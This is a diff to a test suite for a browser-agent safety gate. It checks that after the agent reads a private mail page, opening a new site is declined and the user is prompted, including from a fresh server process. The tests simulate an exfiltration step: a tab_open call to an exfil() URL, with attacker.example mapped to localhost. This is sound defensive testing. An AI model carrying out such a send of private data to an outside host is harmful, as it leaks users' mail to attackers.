@@ -62,7 +62,7 @@ describe('follow-up conversation: the gate memory survives a new server process 
         chrome: {
           mode: 'agent',
           executablePath: await chromiumPath(),
-          extraArgs: [...chromiumArgs(), '--host-resolver-rules=MAP mail.google.com 127.0.0.1, MAP attacker.example 127.0.0.1'],
+          extraArgs: [...chromiumArgs(), '--host-resolver-rules=MAP mail.gmx.net 127.0.0.1, MAP attacker.example 127.0.0.1'],
         },
         safety: { confirm: 'elicit' },
       }),
@@ -88,11 +88,12 @@ describe('follow-up conversation: the gate memory survives a new server process 
     rmSync(home, { recursive: true, force: true, maxRetries: 10, retryDelay: 200 });
   }, 30_000);
 
-  it('server 1 reads mail.google.com → the state file holds the taint (0600)', async () => {
+  // A private mail host that is NOT in Chrome's HSTS preload list (google.com is, so real Chrome forces https on it).
+  it('server 1 reads mail.gmx.net → the state file holds the taint (0600)', async () => {
     const s1 = await server(true);
     try {
       s1.setAnswer('accept'); // whatever opening the mail page asks, the user allows it
-      const opened = await s1.call('tab_open', { browser: 'chrome', url: `http://mail.google.com:${port}/mail/u/0/`, intent: 'check my mail' });
+      const opened = await s1.call('tab_open', { browser: 'chrome', url: `http://mail.gmx.net:${port}/mail/u/0/`, intent: 'check my mail' });
       expect(opened.isError, text(opened)).toBeFalsy();
       const tab = /\b(c\d+)\b/.exec(text(opened))![1]!;
       const snap = await s1.call('read_text', { tab });
@@ -103,13 +104,13 @@ describe('follow-up conversation: the gate memory survives a new server process 
       const out = await s1.call('tab_open', { browser: 'chrome', url: exfil(), intent: 'x' });
       expect(out.isError).toBe(true);
       expect(s1.prompts.length).toBe(1);
-      expect(s1.prompts[0]).toMatch(/mail\.google\.com/);
+      expect(s1.prompts[0]).toMatch(/mail\.gmx\.net/);
     } finally {
       await s1.client.close();
     }
     expect(statSync(statePath).mode & 0o777).toBe(0o600);
     const st = JSON.parse(readFileSync(statePath, 'utf8'));
-    expect(st.privateReads.map((r: { host: string }) => r.host)).toContain('mail.google.com');
+    expect(st.privateReads.map((r: { host: string }) => r.host)).toContain('mail.gmx.net');
   }, 120_000);
 
   it('server 2 (a NEW process, same conversation) asks before sending to a new site, like server 1 did', async () => {
@@ -118,7 +119,7 @@ describe('follow-up conversation: the gate memory survives a new server process 
       const out = await s2.call('tab_open', { browser: 'chrome', url: exfil(), intent: 'x' });
       expect(out.isError).toBe(true);
       expect(s2.prompts.length).toBe(1);
-      expect(s2.prompts[0]).toMatch(/mail\.google\.com/);
+      expect(s2.prompts[0]).toMatch(/mail\.gmx\.net/);
       expect(text(out)).toMatch(/declined/);
     } finally {
       await s2.client.close();
